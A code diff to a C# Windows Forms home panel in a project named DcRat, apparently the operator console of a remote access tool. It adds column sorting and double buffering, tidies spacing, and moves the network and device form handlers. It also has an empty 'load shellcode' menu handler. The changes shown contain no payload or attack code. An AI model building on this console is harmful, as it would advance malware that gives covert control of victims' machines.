@@ -1,4 +1,5 @@
-﻿using DcRat.Properties;
+﻿using DcRat.Controls;
+using DcRat.Properties;
 using DcRat.SingleForms;
 using System;
 using System.Collections.Generic;
@@ -14,6 +15,9 @@ namespace DcRat.ChildForms
 {
     public partial class childFormHome : Form
     {
+
+        private ListViewColumnSorter lvwColumnSorter;
+
         public childFormHome()
         {
             InitializeComponent();
@@ -101,7 +105,7 @@ namespace DcRat.ChildForms
         private void listViewHome_MouseMove(object sender, MouseEventArgs e)
         {
             Color oItemColor = Settings.Default.darkTheme ? ColorTranslator.FromHtml("#2D333B") : Color.Lavender;
-            Color oOriginalColor = Settings.Default.darkTheme? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
+            Color oOriginalColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
 
             ListViewItem lvCurrentItem = listViewHome.GetItemAt(e.X, e.Y);
 
@@ -185,16 +189,16 @@ namespace DcRat.ChildForms
 
         private void listViewHome_MouseLeave(object sender, EventArgs e)
         {
-            if ((lvHoveredItem != null) &&(lvHoveredItem!= listViewHome.Tag))
+            if ((lvHoveredItem != null) && (lvHoveredItem != listViewHome.Tag))
             {
-                lvHoveredItem.BackColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview; 
+                lvHoveredItem.BackColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
             }
             lvHoveredItem = null;
         }
 
         private void listViewHome_MouseDown(object sender, MouseEventArgs e)
         {
-            if (e.Button== MouseButtons.Right)
+            if (e.Button == MouseButtons.Right)
             {
                 return;
             }
@@ -203,7 +207,7 @@ namespace DcRat.ChildForms
                 foreach (ListViewItem item in listViewHome.Items)
                 {
                     item.ForeColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewtextdark : Settings.Default.colorlistviewtext;
-                    item.BackColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview; 
+                    item.BackColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
                 }
                 listViewHome.Tag = null;
             }
@@ -211,7 +215,57 @@ namespace DcRat.ChildForms
 
         private void loadShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            
+        }
 
+        private void listViewHome_DrawItem(object sender, DrawListViewItemEventArgs e)
+        {
+            e.DrawDefault = true;
+        }
+
+        private void toolStripButtonnetwork_Click(object sender, EventArgs e)
+        {
+            singleFormNetwork formNetwork = new singleFormNetwork();
+            formNetwork.Show();
+        }
+
+        private void toolStripButtondevice_Click(object sender, EventArgs e)
+        {
+            singleFormDevice formDevice = new singleFormDevice();
+            formDevice.Show();
+        }
+
+        private void childFormHome_Load(object sender, EventArgs e)
+        {
+            Optimization.EnableListviewDoubleBuffer(listViewHome);
+            lvwColumnSorter = new ListViewColumnSorter();
+            this.listViewHome.ListViewItemSorter = lvwColumnSorter;
+        }
+
+        private void listViewHome_ColumnClick(object sender, ColumnClickEventArgs e)
+        {
+            if (e.Column == lvwColumnSorter.SortColumn)
+            {
+                if (lvwColumnSorter.Order == SortOrder.Ascending)
+                {
+                    lvwColumnSorter.Order = SortOrder.Descending;
+                }
+                else
+                {
+                    lvwColumnSorter.Order = SortOrder.Ascending;
+                }
+            }
+            else
+            {
+                lvwColumnSorter.SortColumn = e.Column;
+                lvwColumnSorter.Order = SortOrder.Ascending;
+            }
+            try
+            {
+                this.listViewHome.Sort();
+            }
+            catch{}
+            
         }
 
         private void listViewHome_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
@@ -246,23 +300,6 @@ namespace DcRat.ChildForms
                 tPoint.X = tRect.X + 3;
                 e.Graphics.DrawString(listViewHome.Columns[i].Text, tFont, tFtontBrush, tPoint);
             }
-        }
-
-        private void listViewHome_DrawItem(object sender, DrawListViewItemEventArgs e)
-        {
-            e.DrawDefault = true;
-        }
-
-        private void toolStripButtonnetwork_Click(object sender, EventArgs e)
-        {
-            singleFormNetwork formNetwork = new singleFormNetwork();
-            formNetwork.Show();
-        }
-
-        private void toolStripButtondevice_Click(object sender, EventArgs e)
-        {
-            singleFormDevice formDevice = new singleFormDevice();
-            formDevice.Show();
         }
     }
 }
